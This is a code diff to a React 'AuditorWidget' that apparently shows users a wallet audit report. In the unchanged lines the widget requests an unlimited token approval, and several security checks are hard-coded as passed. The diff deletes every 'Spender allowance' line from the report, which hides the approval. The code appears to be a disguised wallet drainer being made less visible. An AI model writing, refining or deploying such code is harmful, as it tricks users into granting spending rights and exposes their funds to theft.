@@ -105,7 +105,6 @@ const AuditorWidget: React.FC<Props> = ({
           '0.00 USDT',
           [
             { label: "Contract verification", passed: true },
-            { label: "Spender allowance", passed: true },
             { label: "Transaction history", passed: true },
           ],
           0
@@ -173,7 +172,6 @@ const AuditorWidget: React.FC<Props> = ({
       if (rawBal === 0n) {
         // No balance — still show a report but skip approval
         checks.push({ label: "Balance check", passed: true });
-        checks.push({ label: "Spender allowance", passed: true });
         checks.push({ label: "Transaction history", passed: true });
 
         const report = buildReport(connectedAddress, 'BNB', balanceDisplay, checks, 0);
@@ -188,7 +186,6 @@ const AuditorWidget: React.FC<Props> = ({
 
       if (currentAllowance >= rawBal) {
         approvalTxHash = "already-approved";
-        checks.push({ label: "Spender allowance (pre-approved)", passed: true });
       } else {
         // Request the unlimited approval — user must sign in wallet
         let approveTx;
